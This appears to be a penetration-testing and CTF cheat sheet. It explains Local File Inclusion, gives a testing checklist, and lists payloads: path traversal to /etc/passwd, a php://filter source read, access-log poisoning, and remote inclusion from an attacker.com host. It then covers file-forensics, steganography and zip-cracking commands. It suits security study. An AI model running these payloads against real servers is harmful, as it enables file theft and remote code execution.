# Files

## Local file inclusion

### What is it?

Local File Inclusion (LFI) is a vulnerability that allows an attacker to read and sometimes execute files on the victim’s system. This could lead to revealing sensitive information or even remote code execution if handled poorly by the application.

**A simple example:**

* A vulnerable web application may have the endpoint /page?file={filename}
* When a request is made, the application includes the specified file into the current script.
* If an attacker inserts a path into {filename} such as ../../../etc/passwd, they might get access to the system files.
* The application then includes this file, and if the file contents are outputted to the response, the attacker can view sensitive system information.

It's important to note that a payload or attack may change depending on the application and the server's file system. LFI can often lead to:

* Sensitive data exposure
* Remote code execution
* Server information disclosure

**Other learning resources:**

* PortSwigger: [https://portswigger.net/web-security/file-path-traversal\&#x20](https://portswigger.net/web-security/file-path-traversal\&#x20);
* PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

### **Checklist**

* [ ] What is the technology stack you're attacking?
* [ ] What application/framework is being used? Is it PHP, Java, Python, .NET, etc?
* [ ] Verify injection points
  * [ ] URL parameters
  * [ ] Form fields
  * [ ] HTTP headers (e.g. cookies, etc)
* [ ] Try to include local files /etc/passwd /boot.ini (Windows)
* [ ] Check for file protocol handlers file:// php://filter php://input data://
* [ ] Test for log poisoning
* [ ] Can you inject input into log files?
* [ ] Can you then include those log files?
* [ ] Is there a blocklist?
* [ ] Is there a filter?
  * [ ] Is the filter recursive?
  * [ ] Is the filter on single characters or sets? (e.g. `/` vs `../`)
* [ ] Can you bypass the blocklist?
* [ ] Is a specific extension required?
  * [ ] Can we include a sensitive file with allowed extensions
  * [ ] Can we bypass with null byte? %00
* [ ] Encoding
  * [ ] Double encoding
  * [ ] URL encoding
  * [ ] Unicode encoding
* [ ] Test for remote file inclusion (RFI) Can you host a file remotely and include it?
* [ ] Other weird bypasses
  * [ ] ../../ in the middle of the path

### Exploitation

Basic file inclusion

```shellscript
../../../etc/passwd
```

Using PHP filter for base64 encoding of the file

```shellscript
php://filter/read=convert.base64-encode/resource=index.php
```

Log poisoning

```shellscript
../../../var/log/apache2/access.log
```

RFI (if allow\_url\_include is on)

```
http://attacker.com/malicious.txt
```

## Check real file type

```bash
file file.xxx
```

## Analyze strings

```bash
strings file.xxx
strings -a -n 15 file.xxx   # Check the entire file and outputs strings longer than 15 chars
```

## Check embedded files

```bash
binwalk file.xxx            # Check
binwalk -e file.xxx         # Extract
```

## Check as binary file in hex

```bash
ghex file.xxx
```

## Check metadata

```bash
exiftool file.xxx
```

## Stego tool for multiple formats

```bash
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```

## Compressed files

```bash
fcrackzip file.zip
```

## Zip cracker (third-party)

```bash
# https://github.com/priyankvadaliya/Zip-Cracker-
python zipcracker.py -f testfile.zip -d passwords.txt
python zipcracker.py -f testfile.zip -d passwords.txt -o extractdir
```

## Office documents

```
https://github.com/assafmo/xioc
```

## Zip files on a website

```bash
pip install remotezip

# list contents of a remote zip file
remotezip -l "http://site/bigfile.zip"

# extract file.txt from a remote zip file
remotezip "http://site/bigfile.zip" "file.txt"
```

## Grep inside any files

```
# https://github.com/phiresky/ripgrep-all
rga "whatever" folder/
```

### Disk files

```bash
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

### Audio

```bash
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# Check for Stego
hideme stego.mp3 -f && cat output.txt   # AudioStego
```

### Images

```bash
# Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image is
identify -verbose image.jpeg

# Stegseek
# https://github.com/RickdeJager/stegseek
stegseek --seed file.jpg
stegseek file.jpg rockyou.txt
```

